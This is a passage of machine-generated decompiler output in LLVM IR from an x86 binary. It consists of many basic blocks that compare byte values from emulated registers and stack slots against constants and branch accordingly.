dec_label_pc_804e303:                             ; preds = %dec_label_pc_804ffa3, %dec_label_pc_804e2e9, %dec_label_pc_804ffc5, %dec_label_pc_804ffba
  %v0_804e303 = load i32, i32* @esp, align 4
  %v1_804e303 = add i32 %v0_804e303, 86
  %v2_804e303 = inttoptr i32 %v1_804e303 to i8*
  %v3_804e303 = load i8, i8* %v2_804e303, align 1
  %v4_804e303 = icmp eq i8 %v3_804e303, 0
  br i1 %v4_804e303, label %dec_label_pc_804e318, label %dec_label_pc_804e30a

dec_label_pc_804e30a:                             ; preds = %dec_label_pc_804e303
  %v0_804e30a = load i32, i32* @ebx, align 4
  %v1_804e30a = trunc i32 %v0_804e30a to i8
  %v11_804e30f = icmp eq i8 %v1_804e30a, -91
  br i1 %v11_804e30f, label %dec_label_pc_804de41, label %dec_label_pc_804e318

dec_label_pc_804e318:                             ; preds = %dec_label_pc_804e30a, %dec_label_pc_804e303
  %v1_804e318 = add i32 %v0_804e303, 82
  %v2_804e318 = inttoptr i32 %v1_804e318 to i8*
  %v3_804e318 = load i8, i8* %v2_804e318, align 1
  %v4_804e318 = icmp eq i8 %v3_804e318, 0
  br i1 %v4_804e318, label %dec_label_pc_804e32f, label %dec_label_pc_804e31f

dec_label_pc_804e31f:                             ; preds = %dec_label_pc_804e318
  %v1_804e31f = add i32 %v0_804e303, 53
  %v2_804e31f = inttoptr i32 %v1_804e31f to i8*
  %v3_804e31f = load i8, i8* %v2_804e31f, align 1
  %v4_804e31f = icmp eq i8 %v3_804e31f, 0
  br i1 %v4_804e31f, label %dec_label_pc_804e32f, label %dec_label_pc_804e326

dec_label_pc_804e326:                             ; preds = %dec_label_pc_804e31f
  %v0_804e326 = load i32, i32* @ebx, align 4
  %v1_804e326 = trunc i32 %v0_804e326 to i8
  %tmp715 = icmp ult i8 %v1_804e326, 43
  br i1 %tmp715, label %dec_label_pc_804de41, label %dec_label_pc_804e32f

dec_label_pc_804e32f:                             ; preds = %dec_label_pc_804e326, %dec_label_pc_804e31f, %dec_label_pc_804e318
  %v0_804e32f = load i32, i32* @ebx, align 4
  %v1_804e32f = trunc i32 %v0_804e32f to i8
  %tmp716 = icmp ugt i8 %v1_804e32f, 102
  %v4_804e332 = zext i1 %tmp716 to i8
  %v6_804e332 = add i32 %v0_804e303, 48
  %v7_804e332 = inttoptr i32 %v6_804e332 to i8*
  store i8 %v4_804e332, i8* %v7_804e332, align 1
  %v0_804e337 = load i32, i32* @esp, align 4
  %v1_804e337 = add i32 %v0_804e337, 82
  %v2_804e337 = inttoptr i32 %v1_804e337 to i8*
  %v3_804e337 = load i8, i8* %v2_804e337, align 1
  %v4_804e337 = icmp eq i8 %v3_804e337, 0
  br i1 %v4_804e337, label %dec_label_pc_804e378, label %dec_label_pc_804e33e

dec_label_pc_804e33e:                             ; preds = %dec_label_pc_804e32f
  %v1_804e33e = add i32 %v0_804e337, 48
  %v2_804e33e = inttoptr i32 %v1_804e33e to i8*
  %v3_804e33e = load i8, i8* %v2_804e33e, align 1
  %v4_804e33e = icmp ne i8 %v3_804e33e, 0
  %v0_804e34e.pre = load i32, i32* @ebx, align 4
  %v1_804e345 = trunc i32 %v0_804e34e.pre to i8
  %tmp717 = icmp ult i8 %v1_804e345, 105
  %or.cond210 = and i1 %v4_804e33e, %tmp717
  br i1 %or.cond210, label %dec_label_pc_804de41, label %dec_label_pc_804e34e

dec_label_pc_804e34e:                             ; preds = %dec_label_pc_804e33e
  %tmp718 = icmp ugt i8 %v1_804e345, -89
  %tmp719 = or i8 %v1_804e345, 1
  %tmp720 = icmp eq i8 %tmp719, -87
  %or.cond212 = and i1 %tmp718, %tmp720
  br i1 %or.cond212, label %dec_label_pc_804de41, label %dec_label_pc_804e35c

dec_label_pc_804e35c:                             ; preds = %dec_label_pc_804e34e
  %tmp721 = icmp ugt i8 %v1_804e345, -59
  %tmp722 = icmp eq i8 %tmp719, -57
  %or.cond214 = and i1 %tmp721, %tmp722
  br i1 %or.cond214, label %dec_label_pc_804de41, label %dec_label_pc_804e36a

dec_label_pc_804e36a:                             ; preds = %dec_label_pc_804e35c
  %tmp723 = icmp ugt i8 %v1_804e345, -19
  %v11_804e36f = icmp eq i8 %v1_804e345, -1
  %v1_804e372 = icmp eq i1 %v11_804e36f, false
  %or.cond215 = and i1 %tmp723, %v1_804e372
  br i1 %or.cond215, label %dec_label_pc_804de41, label %dec_label_pc_804e378

dec_label_pc_804e378:                             ; preds = %dec_label_pc_804e36a, %dec_label_pc_804e32f
  %v1_804e378 = add i32 %v0_804e337, 80
  %v2_804e378 = inttoptr i32 %v1_804e378 to i8*
  %v3_804e378 = load i8, i8* %v2_804e378, align 1
  %v4_804e378 = icmp eq i8 %v3_804e378, 0
  br i1 %v4_804e378, label %dec_label_pc_804e38d, label %dec_label_pc_804e37f

dec_label_pc_804e37f:                             ; preds = %dec_label_pc_804e378
  %v0_804e37f = load i32, i32* @ebx, align 4
  %v1_804e37f = trunc i32 %v0_804e37f to i8
  %tmp724 = icmp ugt i8 %v1_804e37f, 112
  %v1_804e37f.off = add i8 %v1_804e37f, -113
  %tmp725 = icmp ult i8 %v1_804e37f.off, 2
  %or.cond217 = and i1 %tmp724, %tmp725
  br i1 %or.cond217, label %dec_label_pc_804de41, label %dec_label_pc_804e38d

dec_label_pc_804e38d:                             ; preds = %dec_label_pc_804e37f, %dec_label_pc_804e378
  %v1_804e38d = add i32 %v0_804e337, 78
  %v2_804e38d = inttoptr i32 %v1_804e38d to i8*
  %v3_804e38d = load i8, i8* %v2_804e38d, align 1
  %v4_804e38d = icmp eq i8 %v3_804e38d, 0
  br i1 %v4_804e38d, label %dec_label_pc_804e3a2, label %dec_label_pc_804e394

dec_label_pc_804e394:                             ; preds = %dec_label_pc_804e38d
  %v0_804e394 = load i32, i32* @ebx, align 4
  %v1_804e394 = trunc i32 %v0_804e394 to i8
  %v1_804e394.off = add i8 %v1_804e394, 105
  %tmp726 = icmp ult i8 %v1_804e394.off, 4
  br i1 %tmp726, label %dec_label_pc_804de41, label %dec_label_pc_804e3a2

dec_label_pc_804e3a2:                             ; preds = %dec_label_pc_804e394, %dec_label_pc_804e38d
  %v0_804e3a2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e3a2 = trunc i32 %v0_804e3a2 to i8
  %v11_804e3a2 = icmp eq i8 %v1_804e3a2, -103
  br i1 %v11_804e3a2, label %dec_label_pc_804ff8c, label %dec_label_pc_804e3ab

dec_label_pc_804e3ab:                             ; preds = %dec_label_pc_804ff8c, %dec_label_pc_804e3a2
  %v1_804e3ab = add i32 %v0_804e337, 72
  %v2_804e3ab = inttoptr i32 %v1_804e3ab to i8*
  %v3_804e3ab = load i8, i8* %v2_804e3ab, align 1
  %v4_804e3ab = icmp eq i8 %v3_804e3ab, 0
  br i1 %v4_804e3ab, label %dec_label_pc_804e3db, label %dec_label_pc_804e3b2

dec_label_pc_804e3b2:                             ; preds = %dec_label_pc_804e3ab
  %v0_804e3b2 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e3b2 = trunc i32 %v0_804e3b2 to i8
  %v4_804e3b2 = icmp ne i8 %v3_804e3b2, 0
  %v0_804e3bf.pre = load i32, i32* @ebx, align 4
  %v1_804e3b6 = trunc i32 %v0_804e3bf.pre to i8
  %tmp727 = icmp ult i8 %v1_804e3b6, 10
  %or.cond220 = and i1 %v4_804e3b2, %tmp727
  %v1_804e3b6.off = add i8 %v1_804e3b6, -74
  %tmp728 = icmp ult i8 %v1_804e3b6.off, 15
  %or.cond584 = or i1 %or.cond220, %tmp728
  %v1_804e3b6.off489 = add i8 %v1_804e3b6, 43
  %tmp729 = icmp ult i8 %v1_804e3b6.off489, 9
  %or.cond586 = or i1 %tmp729, %or.cond584
  br i1 %or.cond586, label %dec_label_pc_804de41, label %dec_label_pc_804e3db

dec_label_pc_804e3db:                             ; preds = %dec_label_pc_804e3b2, %dec_label_pc_804e3ab
  %v1_804e3db = add i32 %v0_804e337, 76
  %v2_804e3db = inttoptr i32 %v1_804e3db to i8*
  %v3_804e3db = load i8, i8* %v2_804e3db, align 1
  %v4_804e3db = icmp eq i8 %v3_804e3db, 0
  br i1 %v4_804e3db, label %dec_label_pc_804e3f0, label %dec_label_pc_804e3e2

dec_label_pc_804e3e2:                             ; preds = %dec_label_pc_804e3db
  %v0_804e3e2 = load i32, i32* @ebx, align 4
  %v1_804e3e2 = trunc i32 %v0_804e3e2 to i8
  %v1_804e3e2.off = add i8 %v1_804e3e2, 106
  %tmp730 = icmp ult i8 %v1_804e3e2.off, 4
  br i1 %tmp730, label %dec_label_pc_804de41, label %dec_label_pc_804e3f0

dec_label_pc_804e3f0:                             ; preds = %dec_label_pc_804e3e2, %dec_label_pc_804e3db
  %v11_804e3f0 = icmp eq i8 %v1_804e3a2, -98
  %v1_804e3f3 = zext i1 %v11_804e3f0 to i32
  %v2_804e3f3 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e3f3 = and i32 %v2_804e3f3, -256
  %v4_804e3f3 = or i32 %v3_804e3f3, %v1_804e3f3
  store i32 %v4_804e3f3, i32* %eax.global-to-local, align 4
  %v1_804e3f6 = add i32 %v0_804e337, 50
  %v2_804e3f6 = inttoptr i32 %v1_804e3f6 to i8*
  %v3_804e3f6 = load i8, i8* %v2_804e3f6, align 1
  %v4_804e3f6 = icmp eq i8 %v3_804e3f6, 0
  %v4_804e40a = icmp eq i1 %v11_804e3f0, false
  br i1 %v4_804e3f6, label %dec_label_pc_804e40a, label %dec_label_pc_804e3fd

dec_label_pc_804e3fd:                             ; preds = %dec_label_pc_804e3f0
  br i1 %v4_804e40a, label %dec_label_pc_804e41c, label %dec_label_pc_804e401

dec_label_pc_804e401:                             ; preds = %dec_label_pc_804e3fd
  %v0_804e401 = load i32, i32* @ebx, align 4
  %v1_804e401 = trunc i32 %v0_804e401 to i8
  %tmp731 = icmp ult i8 %v1_804e401, 21
  br i1 %tmp731, label %dec_label_pc_804de41, label %dec_label_pc_804e40e

dec_label_pc_804e40a:                             ; preds = %dec_label_pc_804e3f0
  br i1 %v4_804e40a, label %dec_label_pc_804e41c, label %dec_label_pc_804e40a.dec_label_pc_804e40e_crit_edge

dec_label_pc_804e40a.dec_label_pc_804e40e_crit_edge: ; preds = %dec_label_pc_804e40a
  %v0_804e40e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e40e

dec_label_pc_804e40e:                             ; preds = %dec_label_pc_804e40a.dec_label_pc_804e40e_crit_edge, %dec_label_pc_804e401
  %v0_804e40e = phi i32 [ %v0_804e40e.pre, %dec_label_pc_804e40a.dec_label_pc_804e40e_crit_edge ], [ %v0_804e401, %dec_label_pc_804e401 ]
  %v1_804e40e = trunc i32 %v0_804e40e to i8
  %v1_804e40e.off = add i8 %v1_804e40e, 21
  %tmp732 = icmp ult i8 %v1_804e40e.off, 12
  br i1 %tmp732, label %dec_label_pc_804de41, label %dec_label_pc_804e41c

dec_label_pc_804e41c:                             ; preds = %dec_label_pc_804e40e, %dec_label_pc_804e40a, %dec_label_pc_804e3fd
  %v11_804e41c = icmp eq i8 %v1_804e3a2, -97
  %v1_804e41f = zext i1 %v11_804e41c to i32
  %v4_804e41f = or i32 %v3_804e3f3, %v1_804e41f
  store i32 %v4_804e41f, i32* %eax.global-to-local, align 4
  %v4_804e422 = icmp eq i1 %v11_804e41c, false
  br i1 %v4_804e422, label %dec_label_pc_804e434, label %dec_label_pc_804e426

dec_label_pc_804e426:                             ; preds = %dec_label_pc_804e41c
  %v0_804e426 = load i32, i32* @ebx, align 4
  %v1_804e426 = trunc i32 %v0_804e426 to i8
  %v10_804e42b = icmp eq i8 %v1_804e426, 120
  br i1 %v10_804e42b, label %dec_label_pc_804de41, label %dec_label_pc_804e434

dec_label_pc_804e434:                             ; preds = %dec_label_pc_804e426, %dec_label_pc_804e41c
  %v8_804e434 = icmp eq i8 %v1_804e3a2, -96
  br i1 %v8_804e434, label %dec_label_pc_804ffec, label %dec_label_pc_804e43d

dec_label_pc_804e43d:                             ; preds = %dec_label_pc_804ffec, %dec_label_pc_804e434
  %v1_804e43d = add i32 %v0_804e337, 60
  %v2_804e43d = inttoptr i32 %v1_804e43d to i8*
  %v3_804e43d = load i8, i8* %v2_804e43d, align 1
  %v4_804e43d = icmp eq i8 %v3_804e43d, 0
  br i1 %v4_804e43d, label %dec_label_pc_804e452, label %dec_label_pc_804e444

dec_label_pc_804e444:                             ; preds = %dec_label_pc_804e43d
  %v0_804e444 = load i32, i32* @ebx, align 4
  %v1_804e444 = trunc i32 %v0_804e444 to i8
  %v1_804e444.off = add i8 %v1_804e444, 32
  %tmp733 = icmp ult i8 %v1_804e444.off, 3
  br i1 %tmp733, label %dec_label_pc_804de41, label %dec_label_pc_804e452

dec_label_pc_804e452:                             ; preds = %dec_label_pc_804e444, %dec_label_pc_804e43d
  %v1_804e452 = add i32 %v0_804e337, 74
  %v2_804e452 = inttoptr i32 %v1_804e452 to i8*
  %v3_804e452 = load i8, i8* %v2_804e452, align 1
  %v4_804e452 = icmp eq i8 %v3_804e452, 0
  br i1 %v4_804e452, label %dec_label_pc_804e469, label %dec_label_pc_804e459

dec_label_pc_804e459:                             ; preds = %dec_label_pc_804e452
  %v1_804e459 = add i32 %v0_804e337, 49
  %v2_804e459 = inttoptr i32 %v1_804e459 to i8*
  %v3_804e459 = load i8, i8* %v2_804e459, align 1
  %v4_804e459 = icmp eq i8 %v3_804e459, 0
  br i1 %v4_804e459, label %dec_label_pc_804e469, label %dec_label_pc_804e460

dec_label_pc_804e460:                             ; preds = %dec_label_pc_804e459
  %v0_804e460 = load i32, i32* @ebx, align 4
  %v1_804e460 = trunc i32 %v0_804e460 to i8
  %tmp734 = icmp ult i8 %v1_804e460, 47
  br i1 %tmp734, label %dec_label_pc_804de41, label %dec_label_pc_804e469

dec_label_pc_804e469:                             ; preds = %dec_label_pc_804e460, %dec_label_pc_804e459, %dec_label_pc_804e452
  %v11_804e469 = icmp eq i8 %v1_804e3a2, -93
  %v1_804e46c = zext i1 %v11_804e469 to i8
  %v3_804e46c = add i32 %v0_804e337, 47
  %v4_804e46c = inttoptr i32 %v3_804e46c to i8*
  store i8 %v1_804e46c, i8* %v4_804e46c, align 1
  %v0_804e471 = load i32, i32* @esp, align 4
  %v1_804e471 = add i32 %v0_804e471, 47
  %v2_804e471 = inttoptr i32 %v1_804e471 to i8*
  %v3_804e471 = load i8, i8* %v2_804e471, align 1
  %v4_804e471 = icmp eq i8 %v3_804e471, 0
  br i1 %v4_804e471, label %dec_label_pc_804e486, label %dec_label_pc_804e478

dec_label_pc_804e478:                             ; preds = %dec_label_pc_804e469
  %v0_804e478 = load i32, i32* @ebx, align 4
  %v1_804e478 = trunc i32 %v0_804e478 to i8
  %tmp735 = icmp ugt i8 %v1_804e478, -52
  %v1_804e478.off = add i8 %v1_804e478, 51
  %tmp736 = icmp ult i8 %v1_804e478.off, 2
  %or.cond228 = and i1 %tmp735, %tmp736
  br i1 %or.cond228, label %dec_label_pc_804de41, label %dec_label_pc_804e486

dec_label_pc_804e486:                             ; preds = %dec_label_pc_804e478, %dec_label_pc_804e469
  %v1_804e486 = add i32 %v0_804e471, 71
  %v2_804e486 = inttoptr i32 %v1_804e486 to i8*
  %v3_804e486 = load i8, i8* %v2_804e486, align 1
  %v4_804e486 = icmp eq i8 %v3_804e486, 0
  br i1 %v4_804e486, label %dec_label_pc_804e4ab, label %dec_label_pc_804e48d

dec_label_pc_804e48d:                             ; preds = %dec_label_pc_804e486
  %v1_804e48d = add i32 %v0_804e471, 49
  %v2_804e48d = inttoptr i32 %v1_804e48d to i8*
  %v3_804e48d = load i8, i8* %v2_804e48d, align 1
  %v4_804e48d = icmp ne i8 %v3_804e48d, 0
  %v0_804e49d.pre = load i32, i32* @ebx, align 4
  %v1_804e494 = trunc i32 %v0_804e49d.pre to i8
  %tmp737 = icmp ult i8 %v1_804e494, 50
  %or.cond230 = and i1 %v4_804e48d, %tmp737
  %v1_804e494.off = add i8 %v1_804e494, 39
  %tmp738 = icmp ult i8 %v1_804e494.off, 16
  %or.cond588 = or i1 %or.cond230, %tmp738
  br i1 %or.cond588, label %dec_label_pc_804de41, label %dec_label_pc_804e4ab

dec_label_pc_804e4ab:                             ; preds = %dec_label_pc_804e48d, %dec_label_pc_804e486
  %v1_804e4ab = add i32 %v0_804e471, 56
  %v2_804e4ab = inttoptr i32 %v1_804e4ab to i8*
  %v3_804e4ab = load i8, i8* %v2_804e4ab, align 1
  %v4_804e4ab = icmp eq i8 %v3_804e4ab, 0
  br i1 %v4_804e4ab, label %dec_label_pc_804e4c0, label %dec_label_pc_804e4b2

dec_label_pc_804e4b2:                             ; preds = %dec_label_pc_804e4ab
  %v0_804e4b2 = load i32, i32* @ebx, align 4
  %v1_804e4b2 = trunc i32 %v0_804e4b2 to i8
  %tmp739 = icmp ugt i8 %v1_804e4b2, -5
  %tmp740 = or i8 %v1_804e4b2, 1
  %tmp741 = icmp eq i8 %tmp740, -3
  %or.cond233 = and i1 %tmp739, %tmp741
  br i1 %or.cond233, label %dec_label_pc_804de41, label %dec_label_pc_804e4c0

dec_label_pc_804e4c0:                             ; preds = %dec_label_pc_804e4b2, %dec_label_pc_804e4ab
  %v0_804e4c0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e4c0 = trunc i32 %v0_804e4c0 to i8
  %v11_804e4c0 = icmp eq i8 %v1_804e4c0, -57
  %v1_804e4c3 = zext i1 %v11_804e4c0 to i8
  %v3_804e4c3 = add i32 %v0_804e471, 46
  %v4_804e4c3 = inttoptr i32 %v3_804e4c3 to i8*
  store i8 %v1_804e4c3, i8* %v4_804e4c3, align 1
  %v0_804e4c8 = load i32, i32* @esp, align 4
  %v1_804e4c8 = add i32 %v0_804e4c8, 46
  %v2_804e4c8 = inttoptr i32 %v1_804e4c8 to i8*
  %v3_804e4c8 = load i8, i8* %v2_804e4c8, align 1
  %v4_804e4c8 = icmp eq i8 %v3_804e4c8, 0
  br i1 %v4_804e4c8, label %dec_label_pc_804e4dd, label %dec_label_pc_804e4cf

dec_label_pc_804e4cf:                             ; preds = %dec_label_pc_804e4c0
  %v0_804e4cf = load i32, i32* @ebx, align 4
  %v1_804e4cf = trunc i32 %v0_804e4cf to i8
  %v1_804e4cf.off = add i8 %v1_804e4cf, -121
  %tmp742 = icmp ult i8 %v1_804e4cf.off, -123
  br i1 %tmp742, label %dec_label_pc_804de41, label %dec_label_pc_804e4dd

dec_label_pc_804e4dd:                             ; preds = %dec_label_pc_804e4cf, %dec_label_pc_804e4c0
  %v1_804e4dd = add i32 %v0_804e4c8, 50
  %v2_804e4dd = inttoptr i32 %v1_804e4dd to i8*
  %v3_804e4dd = load i8, i8* %v2_804e4dd, align 1
  %v4_804e4dd = icmp eq i8 %v3_804e4dd, 0
  br i1 %v4_804e4dd, label %dec_label_pc_804e4ed, label %dec_label_pc_804e4e4

dec_label_pc_804e4e4:                             ; preds = %dec_label_pc_804e4dd
  %v0_804e4e4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e4e4 = trunc i32 %v0_804e4e4 to i8
  %v11_804e4e4 = icmp eq i8 %v1_804e4e4, -51
  br i1 %v11_804e4e4, label %dec_label_pc_8050003, label %dec_label_pc_804e4ed

dec_label_pc_804e4ed:                             ; preds = %dec_label_pc_8050003, %dec_label_pc_804e4e4, %dec_label_pc_804e4dd
  %v1_804e4ed = add i32 %v0_804e4c8, 65
  %v2_804e4ed = inttoptr i32 %v1_804e4ed to i8*
  %v3_804e4ed = load i8, i8* %v2_804e4ed, align 1
  %v4_804e4ed = icmp eq i8 %v3_804e4ed, 0
  br i1 %v4_804e4ed, label %dec_label_pc_804e502, label %dec_label_pc_804e4f4

dec_label_pc_804e4f4:                             ; preds = %dec_label_pc_804e4ed
  %v0_804e4f4 = load i32, i32* @ebx, align 4
  %v1_804e4f4 = trunc i32 %v0_804e4f4 to i8
  %tmp743 = icmp ugt i8 %v1_804e4f4, 59
  %tmp744 = or i8 %v1_804e4f4, 1
  %tmp745 = icmp eq i8 %tmp744, 61
  %or.cond236 = and i1 %tmp743, %tmp745
  br i1 %or.cond236, label %dec_label_pc_804de41, label %dec_label_pc_804e502

dec_label_pc_804e502:                             ; preds = %dec_label_pc_804e4f4, %dec_label_pc_804e4ed
  %v0_804e502 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e502 = trunc i32 %v0_804e502 to i8
  %v10_804e502 = icmp eq i8 %v1_804e502, 104
  %v1_804e505 = zext i1 %v10_804e502 to i8
  %v3_804e505 = add i32 %v0_804e4c8, 45
  %v4_804e505 = inttoptr i32 %v3_804e505 to i8*
  store i8 %v1_804e505, i8* %v4_804e505, align 1
  %v0_804e50a = load i32, i32* @esp, align 4
  %v1_804e50a = add i32 %v0_804e50a, 58
  %v2_804e50a = inttoptr i32 %v1_804e50a to i8*
  %v3_804e50a = load i8, i8* %v2_804e50a, align 1
  %v4_804e50a = icmp eq i8 %v3_804e50a, 0
  br i1 %v4_804e50a, label %dec_label_pc_804e521, label %dec_label_pc_804e511

dec_label_pc_804e511:                             ; preds = %dec_label_pc_804e502
  %v1_804e511 = add i32 %v0_804e50a, 45
  %v2_804e511 = inttoptr i32 %v1_804e511 to i8*
  %v3_804e511 = load i8, i8* %v2_804e511, align 1
  %v4_804e511 = icmp eq i8 %v3_804e511, 0
  br i1 %v4_804e511, label %dec_label_pc_804e521, label %dec_label_pc_804e518

dec_label_pc_804e518:                             ; preds = %dec_label_pc_804e511
  %v0_804e518 = load i32, i32* @ebx, align 4
  %v1_804e518 = trunc i32 %v0_804e518 to i8
  %tmp746 = icmp ult i8 %v1_804e518, 31
  br i1 %tmp746, label %dec_label_pc_804de41, label %dec_label_pc_804e521

dec_label_pc_804e521:                             ; preds = %dec_label_pc_804e518, %dec_label_pc_804e511, %dec_label_pc_804e502
  %v0_804e521 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e521 = trunc i32 %v0_804e521 to i8
  %v11_804e521 = icmp eq i8 %v1_804e521, -68
  %v1_804e524 = zext i1 %v11_804e521 to i8
  %v3_804e524 = add i32 %v0_804e50a, 44
  %v4_804e524 = inttoptr i32 %v3_804e524 to i8*
  store i8 %v1_804e524, i8* %v4_804e524, align 1
  %v0_804e529 = load i32, i32* @esp, align 4
  %v1_804e529 = add i32 %v0_804e529, 44
  %v2_804e529 = inttoptr i32 %v1_804e529 to i8*
  %v3_804e529 = load i8, i8* %v2_804e529, align 1
  %v4_804e529 = icmp eq i8 %v3_804e529, 0
  br i1 %v4_804e529, label %dec_label_pc_804e542, label %dec_label_pc_804e530

dec_label_pc_804e530:                             ; preds = %dec_label_pc_804e521
  %v0_804e530 = load i32, i32* @ebx, align 4
  %v1_804e530 = trunc i32 %v0_804e530 to i8
  switch i8 %v1_804e530, label %dec_label_pc_804e542 [
    i8 -90, label %dec_label_pc_804de41
    i8 -30, label %dec_label_pc_804de41
  ]

dec_label_pc_804e542:                             ; preds = %dec_label_pc_804e530, %dec_label_pc_804e521
  %v0_804e542 = load i32, i32* %eax.global-to-local, align 4
  %v3_804e542 = trunc i32 %v0_804e542 to i8
  %v4_804e542 = icmp eq i8 %v3_804e542, 0
  br i1 %v4_804e542, label %dec_label_pc_804e54f, label %dec_label_pc_804e546

dec_label_pc_804e546:                             ; preds = %dec_label_pc_804e542
  %v0_804e546 = load i32, i32* @ebx, align 4
  %v1_804e546 = trunc i32 %v0_804e546 to i8
  %v11_804e546 = icmp eq i8 %v1_804e546, -53
  br i1 %v11_804e546, label %dec_label_pc_804de41, label %dec_label_pc_804e54f

dec_label_pc_804e54f:                             ; preds = %dec_label_pc_804e546, %dec_label_pc_804e542
  %v1_804e54f = add i32 %v0_804e529, 74
  %v2_804e54f = inttoptr i32 %v1_804e54f to i8*
  %v3_804e54f = load i8, i8* %v2_804e54f, align 1
  %v4_804e54f = icmp eq i8 %v3_804e54f, 0
  br i1 %v4_804e54f, label %dec_label_pc_804e55f, label %dec_label_pc_804e556

dec_label_pc_804e556:                             ; preds = %dec_label_pc_804e54f
  %v0_804e556 = load i32, i32* @ebx, align 4
  %v1_804e556 = trunc i32 %v0_804e556 to i8
  %v11_804e556 = icmp eq i8 %v1_804e556, -13
  br i1 %v11_804e556, label %dec_label_pc_804de41, label %dec_label_pc_804e55f

dec_label_pc_804e55f:                             ; preds = %dec_label_pc_804e556, %dec_label_pc_804e54f
  %v0_804e55f = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e55f = trunc i32 %v0_804e55f to i8
  %v10_804e55f = icmp eq i8 %v1_804e55f, 45
  %v1_804e562 = zext i1 %v10_804e55f to i8
  %v3_804e562 = add i32 %v0_804e529, 43
  %v4_804e562 = inttoptr i32 %v3_804e562 to i8*
  store i8 %v1_804e562, i8* %v4_804e562, align 1
  %v0_804e567 = load i32, i32* @esp, align 4
  %v1_804e567 = add i32 %v0_804e567, 64
  %v2_804e567 = inttoptr i32 %v1_804e567 to i8*
  %v3_804e567 = load i8, i8* %v2_804e567, align 1
  %v4_804e567 = icmp eq i8 %v3_804e567, 0
  br i1 %v4_804e567, label %dec_label_pc_804e579, label %dec_label_pc_804e56e

dec_label_pc_804e56e:                             ; preds = %dec_label_pc_804e55f
  %v1_804e56e = add i32 %v0_804e567, 43
  %v2_804e56e = inttoptr i32 %v1_804e56e to i8*
  %v3_804e56e = load i8, i8* %v2_804e56e, align 1
  %v4_804e56e = icmp eq i8 %v3_804e56e, 0
  %v1_804e573 = icmp eq i1 %v4_804e56e, false
  br i1 %v1_804e573, label %dec_label_pc_804de41, label %dec_label_pc_804e579

dec_label_pc_804e579:                             ; preds = %dec_label_pc_804e56e, %dec_label_pc_804e55f
  %v0_804e579 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e579 = trunc i32 %v0_804e579 to i8
  %v11_804e579 = icmp eq i8 %v1_804e579, -78
  %v1_804e57c = zext i1 %v11_804e579 to i8
  %v3_804e57c = add i32 %v0_804e567, 42
  %v4_804e57c = inttoptr i32 %v3_804e57c to i8*
  store i8 %v1_804e57c, i8* %v4_804e57c, align 1
  %v0_804e581 = load i32, i32* @ebx, align 4
  %v1_804e581 = trunc i32 %v0_804e581 to i8
  %v10_804e581 = icmp eq i8 %v1_804e581, 62
  %v1_804e584 = zext i1 %v10_804e581 to i8
  %v2_804e584 = load i32, i32* @esp, align 4
  %v3_804e584 = add i32 %v2_804e584, 41
  %v4_804e584 = inttoptr i32 %v3_804e584 to i8*
  store i8 %v1_804e584, i8* %v4_804e584, align 1
  %v0_804e589 = load i32, i32* @esp, align 4
  %v1_804e589 = add i32 %v0_804e589, 42
  %v2_804e589 = inttoptr i32 %v1_804e589 to i8*
  %v3_804e589 = load i8, i8* %v2_804e589, align 1
  %v4_804e589 = icmp eq i8 %v3_804e589, 0
  br i1 %v4_804e589, label %dec_label_pc_804e59b, label %dec_label_pc_804e590

dec_label_pc_804e590:                             ; preds = %dec_label_pc_804e579
  %v1_804e590 = add i32 %v0_804e589, 41
  %v2_804e590 = inttoptr i32 %v1_804e590 to i8*
  %v3_804e590 = load i8, i8* %v2_804e590, align 1
  %v4_804e590 = icmp eq i8 %v3_804e590, 0
  %v1_804e595 = icmp eq i1 %v4_804e590, false
  br i1 %v1_804e595, label %dec_label_pc_804de41, label %dec_label_pc_804e59b

dec_label_pc_804e59b:                             ; preds = %dec_label_pc_804e590, %dec_label_pc_804e579
  %v1_804e59b = add i32 %v0_804e589, 45
  %v2_804e59b = inttoptr i32 %v1_804e59b to i8*
  %v3_804e59b = load i8, i8* %v2_804e59b, align 1
  %v4_804e59b = icmp eq i8 %v3_804e59b, 0
  br i1 %v4_804e59b, label %dec_label_pc_804e5b4, label %dec_label_pc_804e5a2

dec_label_pc_804e5a2:                             ; preds = %dec_label_pc_804e59b
  %v0_804e5a2 = load i32, i32* @ebx, align 4
  %v1_804e5a2 = trunc i32 %v0_804e5a2 to i8
  switch i8 %v1_804e5a2, label %dec_label_pc_804e5b4 [
    i8 -125, label %dec_label_pc_804de41
    i8 -20, label %dec_label_pc_804de41
  ]

dec_label_pc_804e5b4:                             ; preds = %dec_label_pc_804e5a2, %dec_label_pc_804e59b
  %v0_804e5b4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e5b4 = trunc i32 %v0_804e5b4 to i8
  %v10_804e5b4 = icmp eq i8 %v1_804e5b4, 107
  %v1_804e5b7 = zext i1 %v10_804e5b4 to i8
  %v3_804e5b7 = add i32 %v0_804e589, 40
  %v4_804e5b7 = inttoptr i32 %v3_804e5b7 to i8*
  store i8 %v1_804e5b7, i8* %v4_804e5b7, align 1
  %v0_804e5bc = load i32, i32* @ebx, align 4
  %v1_804e5bc = trunc i32 %v0_804e5bc to i8
  %v11_804e5bc = icmp eq i8 %v1_804e5bc, -86
  %v1_804e5bf = zext i1 %v11_804e5bc to i8
  %v2_804e5bf = load i32, i32* @esp, align 4
  %v3_804e5bf = add i32 %v2_804e5bf, 39
  %v4_804e5bf = inttoptr i32 %v3_804e5bf to i8*
  store i8 %v1_804e5bf, i8* %v4_804e5bf, align 1
  %v0_804e5c4 = load i32, i32* @esp, align 4
  %v1_804e5c4 = add i32 %v0_804e5c4, 40
  %v2_804e5c4 = inttoptr i32 %v1_804e5c4 to i8*
  %v3_804e5c4 = load i8, i8* %v2_804e5c4, align 1
  %v4_804e5c4 = icmp eq i8 %v3_804e5c4, 0
  br i1 %v4_804e5c4, label %dec_label_pc_804e5d6, label %dec_label_pc_804e5cb

dec_label_pc_804e5cb:                             ; preds = %dec_label_pc_804e5b4
  %v1_804e5cb = add i32 %v0_804e5c4, 39
  %v2_804e5cb = inttoptr i32 %v1_804e5cb to i8*
